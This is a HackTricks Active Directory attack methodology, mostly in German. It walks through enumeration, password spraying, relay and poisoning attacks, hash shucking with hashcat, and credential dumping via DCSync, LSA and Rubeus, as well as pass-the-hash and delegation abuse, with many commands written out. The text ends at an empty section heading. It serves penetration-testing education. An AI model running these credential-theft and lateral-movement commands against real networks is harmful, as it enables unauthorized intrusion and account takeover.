# Active Directory Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Übersicht

**Active Directory** dient als grundlegende Technologie, die **Netzwerkadministratoren** erlaubt, **Domains**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist so konzipiert, dass es skaliert und eine große Anzahl von Benutzern in verwaltbare **Gruppen** und **Untergruppen** organisiert, während es **Zugriffsrechte** auf verschiedenen Ebenen steuert.

Die Struktur von **Active Directory** besteht aus drei Hauptebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten wie **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** repräsentiert die Sammlung mehrerer Trees, die durch **trust relationships** verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Spezifische **Zugriffs-** und **Kommunikationsrechte** können auf jeder dieser Ebenen festgelegt werden.

Wichtige Konzepte innerhalb von **Active Directory** umfassen:

1. **Directory** – Enthält alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Entitäten im Verzeichnis, einschließlich **Benutzern**, **Gruppen** oder **Freigaben**.
3. **Domain** – Dient als Container für Verzeichnisobjekte; mehrere Domains können innerhalb eines **forests** koexistieren, wobei jede ihre eigene Objektsammlungen besitzt.
4. **Tree** – Eine Gruppierung von Domains, die eine gemeinsame Root-Domain teilen.
5. **Forest** – Die oberste Organisationsebene in Active Directory, bestehend aus mehreren Trees mit **trust relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks wichtig sind. Diese Dienste beinhalten:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet die Interaktionen zwischen **Benutzern** und **Domains**, einschließlich **Authentication** und **Search**-Funktionalitäten.
2. **Certificate Services** – Verwaltet die Erstellung, Verteilung und Administration sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützt verzeichnisfähige Anwendungen über das **LDAP protocol**.
4. **Directory Federation Services** – Bietet **single-sign-on**-Funktionen, um Benutzer über mehrere Webanwendungen in einer Sitzung zu authentifizieren.
5. **Rights Management** – Hilft beim Schutz von urheberrechtlich geschütztem Material, indem es dessen unautorisierte Verbreitung und Nutzung einschränkt.
6. **DNS Service** – Wichtig für die Auflösung von **domain names**.

Für eine detailliertere Erklärung siehe: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man ein **AD** angreift, muss man den **Kerberos authentication process** wirklich gut verstehen.\
[**Lies diese Seite, falls du noch nicht weißt, wie es funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Du kannst viel auf [https://wadcoms.github.io/](https://wadcoms.github.io/) finden, um schnell einen Überblick darüber zu bekommen, welche Befehle du ausführen kannst, um ein AD zu enumerieren/exploiten.

> [!WARNING]
> Kerberos-Kommunikation erfordert einen vollständigen qualifizierten Namen (FQDN) für Aktionen. Wenn du versuchst, über die IP-Adresse auf eine Maschine zuzugreifen, **wird NTLM und nicht Kerberos verwendet**.

## Recon Active Directory (Keine Anmeldeinformationen/Sitzungen)

Wenn du Zugriff auf eine AD-Umgebung hast, aber keine Anmeldeinformationen/Sitzungen, könntest du:

- **Pentest the network:**
- Scanne das Netzwerk, finde Maschinen und offene Ports und versuche, **Vulnerabilities auszunutzen** oder **Credentials** daraus zu extrahieren (zum Beispiel können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
- Die Enumeration von DNS kann Informationen über wichtige Server in der Domain liefern wie Webserver, Drucker, Freigaben, VPN, Media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Schau dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um mehr Informationen darüber zu finden, wie man das macht.
- **Check für null- und Guest-Zugriff auf smb-Services** (dies funktioniert nicht auf modernen Windows-Versionen):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Einen detaillierteren Leitfaden zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Einen detaillierteren Leitfaden zur LDAP-Enumeration findest du hier (achte **besonders auf anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sammle Credentials, indem du **Dienste mit Responder impersonierst** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Greife Hosts an, indem du [**den relay attack ausnutzt**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sammle Credentials, indem du **falsche UPnP-Services mit evil-S exponierst** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzernamen/Namen aus internen Dokumenten, Social Media, Services (hauptsächlich Web) innerhalb der Domain-Umgebungen und auch aus öffentlich Verfügbaren Quellen.
- Wenn du vollständige Namen von Firmenmitarbeitern findest, kannst du verschiedene AD **Benutzername-Konventionen** ausprobieren ([**lies das**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die gebräuchlichsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (3 Buchstaben von jedem), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Siehe die Seiten [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername angefragt** wird, antwortet der Server mit dem **Kerberos error** Code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, was es uns erlaubt zu bestimmen, dass der Benutzername ungültig war. **Gültige Benutzernamen** führen entweder zu einem **TGT in einer AS-REP**-Antwort oder dem Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_, was anzeigt, dass der Benutzer Pre-Authentication durchführen muss.
- **No Authentication against MS-NRPC**: Verwendung von auth-level = 1 (Keine Authentifizierung) gegen die MS-NRPC (Netlogon)-Schnittstelle auf Domain-Controllern. Die Methode ruft die Funktion `DsrGetDcNameEx2` auf, nachdem die MS-NRPC-Schnittstelle gebunden wurde, um zu prüfen, ob der Benutzer oder Computer ohne irgendwelche Anmeldeinformationen existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art von Enumeration. Die Forschung dazu ist [hier zu finden](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn Sie einen dieser Server im Netzwerk gefunden haben, können Sie auch **user enumeration dagegen** durchführen. Zum Beispiel könnten Sie das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Sie können Listen von Benutzernamen in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) finden.
>
> Sie sollten jedoch die **Namen der Personen, die in der Firma arbeiten** aus dem recon-Schritt haben, den Sie zuvor durchgeführt haben sollten. Mit Vor- und Nachname können Sie das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Knowing one or several usernames

Ok, Sie wissen also bereits, dass Sie einen gültigen Benutzernamen haben, aber keine Passwörter... Dann versuchen Sie:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer **nicht** das Attribut _DONT_REQ_PREAUTH_ hat, können Sie **eine AS_REP message anfordern** für diesen Benutzer, die einige Daten enthält, die mit einer Ableitung des Passworts des Benutzers verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuchen Sie die am häufigsten verwendeten **Passwörter** bei jedem der entdeckten Benutzer; vielleicht verwendet ein Benutzer ein schwaches Passwort (beachten Sie die Passwort-Richtlinie!).
- Beachten Sie, dass Sie auch **spray OWA servers** können, um zu versuchen, Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise können Sie einige Challenge **hashes** erhalten, die Sie knacken können, indem Sie einige Protokolle im **Netzwerk** poisonen:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn es Ihnen gelungen ist, das Active Directory zu enumerieren, haben Sie **mehr E-Mails und ein besseres Verständnis des Netzwerks**. Möglicherweise können Sie NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD-Umgebung zu erhalten.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay to the DC is blocked** durch Signing, sollte trotzdem die **LDAP**-Postur geprüft werden: `netexec ldap <dc>` zeigt `(signing:None)` / schwache channel binding. Ein DC, bei dem SMB signing erforderlich ist, LDAP signing aber deaktiviert ist, bleibt ein verwertbares **relay-to-LDAP**-Ziel für Missbrauch wie **SPN-less RBCD**.

### Client-seitige Drucker-Anmeldeinformations leaks → Massenhafte Domain-Anmeldeinformations-Validierung

- Drucker-/Web-UIs betten manchmal **maskierte Admin-Passwörter im HTML** ein. Quelltext/DevTools anzeigen kann Klartext offenbaren (z. B. `<input value="<password>">`), wodurch Basic-auth-Zugriff auf Scan-/Druck-Repositories möglich wird.
- Abgerufene Druckaufträge können **Klartext-Onboarding-Dokumente** mit per-Benutzer-Passwörtern enthalten. Halte Zuordnungen beim Testen konsistent:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Creds stehlen

Wenn du mit dem **null or guest user** auf **andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die, falls sie irgendwie geöffnet werden, t**rigger an NTLM authentication against you** sodass du die **NTLM challenge** **stehlen** kannst, um sie zu cracken:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Angriffe

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos RC4-Tickets, NetNTLM-Challenges oder gecachten Anmeldeinformationen zu brute-forcen, fütterst du die NT-Hashes in Hashcats NT-candidate-Modi und lässt prüfen, ob Passwörter wiederverwendet wurden, ohne jemals das Klartextpasswort zu erfahren. Das ist besonders wirkungsvoll nach einer Domain-Kompromittierung, wenn du tausende aktuelle und historische NT-Hashes sammeln kannst.

Verwende shucking wenn:

- Du ein NT-Korpus aus DCSync, SAM/SECURITY Dumps oder Credential Vaults hast und testen musst, ob Wiederverwendung in anderen Domains/Forests vorliegt.
- Du RC4-basierte Kerberos-Materialien (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Responses oder DCC/DCC2-Blobs erfasst hast.
- Du schnell Wiederverwendung für lange, unknackbare Passphrasen beweisen und sofort via Pass-the-Hash pivoten willst.

Die Technik **funktioniert nicht** gegen Encryption-Types, deren Schlüssel nicht der NT-Hash sind (z. B. Kerberos etype 17/18 AES). Wenn eine Domain AES-only erzwingt, musst du zu den regulären Passwort-Modi zurückkehren.

#### Aufbau eines NT-Hash-Korpus

- **DCSync/NTDS** – Verwende `secretsdump.py` mit History, um die größtmögliche Menge an NT-Hashes (und deren vorherige Werte) zu extrahieren:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool erheblich, weil Microsoft bis zu 24 vorherige Hashes pro Account speichern kann. Für weitere Methoden, NTDS-Secrets zu sammeln, siehe:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY-Daten und gecachte Domain-Logons (DCC/DCC2). Dedupliziere und hänge diese Hashes an dieselbe `nt_candidates.txt` Liste an.
- **Metadaten verfolgen** – Behalte den Username/Domain, der jeden Hash erzeugt hat (auch wenn die Wordlist nur Hex enthält). Treffernde Hashes zeigen dir sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den erfolgreichen Kandidaten ausgibt.
- Bevorzuge Kandidaten aus demselben Forest oder einem vertrauenswürdigen Forest; das maximiert die Chance auf Überschneidungen beim Shucking.

#### Hashcat NT-candidate Modi

| Hash-Typ                                 | Passwort-Modus | NT-Candidate-Modus |
| ---------------------------------------- | -------------- | ------------------ |
| Domain Cached Credentials (DCC)          | 1100           | 31500              |
| Domain Cached Credentials 2 (DCC2)       | 2100           | 31600              |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500           | 27000              |
| NetNTLMv2                                | 5600           | 27100              |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500           | _N/A_              |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100          | 35300              |
| Kerberos 5 etype 23 AS-REP               | 18200          | 35400              |

Hinweise:

- NT-candidate-Eingaben **müssen rohe 32-hex NT-Hashes** bleiben. Deaktiviere Rule-Engines (kein `-r`, keine Hybrid-Modi), weil Mangling das Kandidaten-Schlüsselmaterial zerstört.
- Diese Modi sind nicht per se schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist ~100× schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist deutlich günstiger als das Durchsuchen des gesamten Passwortraums im langsamen Format.
- Führe immer das **aktuellste Hashcat-Build** aus (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300/35400 relativ neu sind.
- Es gibt derzeit keinen NT-Modus für AS-REQ Pre-Auth, und AES-etypes (19600/19700) benötigen das Klartextpasswort, weil ihre Schlüssel via PBKDF2 aus UTF-16LE-Passwörtern abgeleitet werden, nicht aus rohen NT-Hashes.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse ein RC4 TGS für ein Ziel-SPN mit einem wenig privilegierten Benutzer (siehe die Kerberoast-Seite für Details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shucke das Ticket mit deiner NT-Liste:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet den RC4-Schlüssel aus jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...` Blob. Ein Treffer bestätigt, dass das Service-Konto einen deiner vorhandenen NT-Hashes verwendet.

3. Sofortiges Pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du später den Klartext mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls nötig.

#### Beispiel – Gecachte Anmeldedaten (Modus 31600)

1. Dump die gecachten Logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile für den interessanten Domain-Benutzer in `dcc2_highpriv.txt` und shucke sie:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ein erfolgreicher Treffer liefert den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder brute-force ihn im schnellen NTLM-Modus, um den String wiederherzustellen.

Der gleiche Workflow gilt für NetNTLM Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Treffer identifiziert ist, kannst du Relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline mit Masks/Rules erneut cracken.



## Enumerating Active Directory WITH credentials/session

Für diese Phase musst du die **credentials oder eine Session eines gültigen Domain-Accounts kompromittiert** haben. Wenn du einige gültige Anmeldeinformationen oder eine Shell als Domain-Benutzer hast, **solltest du daran denken**, dass die zuvor genannten Optionen weiterhin Möglichkeiten sind, andere Nutzer zu kompromittieren.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du wissen, was das **Kerberos double hop problem** ist.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Einen Account kompromittiert zu haben ist ein **großer Schritt**, um die gesamte Domain zu kompromittieren, denn du kannst jetzt mit der **Active Directory Enumeration** beginnen:

Bezüglich [**ASREPRoast**](asreproast.md) kannst du nun jeden möglichen verwundbaren Benutzer finden, und bezüglich [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Usernames** erhalten und das Passwort des kompromittierten Kontos, leere Passwörter und neue vielversprechende Passwörter ausprobieren.

- Du könntest das [**CMD für ein grundlegendes Recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden
- Du kannst auch [**PowerShell für Recon**](../basic-powershell-for-pentesters/index.html) nutzen, was stealthier ist
- Du kannst auch [**PowerView**](../basic-powershell-for-pentesters/powerview.md) verwenden, um detailliertere Informationen zu extrahieren
- Ein weiteres großartiges Tool für Recon in Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht sehr stealthy** (abhängig von den verwendeten Collection-Methoden), aber **wenn es dir egal ist**, solltest du es unbedingt ausprobieren. Finde, wo Benutzer RDP nutzen können, finde Pfade zu anderen Gruppen, etc.
- **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), da diese interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des Verzeichnisses nutzen kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch die LDAP-Datenbank mit **ldapsearch** durchsuchen, um nach Credentials in den Feldern _userPassword_ & _unixUserPassword_ oder sogar in _Description_ zu suchen. Siehe [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** verwendest, könntest du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools ausprobieren wie:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-User extrahieren**

Es ist sehr einfach, alle Domain-Usernames unter Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt klein wirkt, ist dies der wichtigste Teil von allen. Greife auf die Links zu (hauptsächlich die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während einer Assessment-Phase ist dies der entscheidende Moment, um deinen Weg zu DA zu finden oder zu entscheiden, dass nichts getan werden kann.

### Kerberoast

Kerberoasting beinhaltet das Erlangen von **TGS-Tickets**, die von Services genutzt werden, die an Benutzerkonten gebunden sind, und das Offline-Cracken ihrer Verschlüsselung — die auf Benutzerpasswörtern basiert.

Mehr dazu in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote-Verbindungen (RDP, SSH, FTP, Win-RM, etc)

Sobald du einige Credentials erhalten hast, könntest du prüfen, ob du Zugriff auf irgendeine **Maschine** hast. Dafür kannst du **CrackMapExec** nutzen, um Verbindungsversuche zu mehreren Servern mit verschiedenen Protokollen entsprechend den Port-Scans durchzuführen.

### Lokale Privilegieneskalation

Wenn du Credentials oder eine Session als normaler Domain-User kompromittiert hast und du mit diesem Benutzer **Zugriff** auf **eine Maschine in der Domain** hast, solltest du versuchen, lokal Privilegien zu eskalieren und nach Credentials zu suchen. Nur mit lokalen Administrator-Rechten kannst du die **Hashes anderer Nutzer** im Speicher (LSASS) und lokal (SAM) dumpen.

Es gibt eine komplette Seite in diesem Buch über [**lokale Privilege Escalation in Windows**](../windows-local-privilege-escalation/index.html) und eine [**Checklist**](../checklist-windows-privilege-escalation.md). Vergiss auch nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Aktuelle Session-Tickets

Es ist sehr **unwahrscheinlich**, dass du **Tickets** im aktuellen Benutzer findest, die dir die Berechtigung geben, auf unerwartete Ressourcen zuzugreifen, aber du könntest prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Suche nach Creds in Computer Shares | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilegieneskalation im Active Directory MIT privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hoffentlich ist es dir gelungen, ein **local admin** Konto zu kompromittieren, indem du [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) verwendet hast.\
Dann ist es Zeit, alle Hashes im Speicher und lokal zu dumpen.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies sehr **auffällig** ist und **LAPS** dies **mildern** würde.

### MSSQL Missbrauch & Trusted Links

Wenn ein Benutzer Berechtigungen hat, **MSSQL instances** zu **accessen**, könnte er diese benutzen, um **Befehle auszuführen** auf dem MSSQL-Host (wenn dieser als SA läuft), den NetNTLM **hash** zu **stehlen** oder sogar einen **relay** **attack** durchzuführen.\
Außerdem: Wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz als trusted (database link) konfiguriert ist und der Benutzer Berechtigungen in der trusted database hat, kann er die **Trust-Beziehung nutzen, um auch in der anderen Instanz queries auszuführen**. Diese Trusts können verkettet werden, und irgendwann könnte der Benutzer eine fehlkonfigurierte Datenbank finden, in der er Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über forest trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT-Asset-/Deployment-Plattformen Missbrauch

Third-party inventory und deployment Suites öffnen oft mächtige Pfade zu Credentials und code execution. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computer-Objekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Berechtigungen auf dem Computer hast, kannst du TGTs aus dem Speicher aller Nutzer dumpen, die sich an diesem Computer anmelden.\
Wenn sich also ein **Domain Admin** an dem Computer anmeldet, kannst du dessen TGT dumpen und ihn mittels [Pass the Ticket](pass-the-ticket.md) impersonifizieren.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn einem User oder Computer "Constrained Delegation" erlaubt ist, kann er **jeden Nutzer impersonifizieren, um auf bestimmte Services auf einem Computer zuzugreifen**.\
Wenn du dann den **hash** dieses Users/Computers kompromittierst, kannst du **jeden Nutzer** (auch Domain Admins) impersonifizieren, um auf diese Services zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Das Haben von **WRITE**-Rechten auf einem Active Directory-Objekt eines entfernten Computers ermöglicht die Erlangung von code execution mit **erhöhten Rechten**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

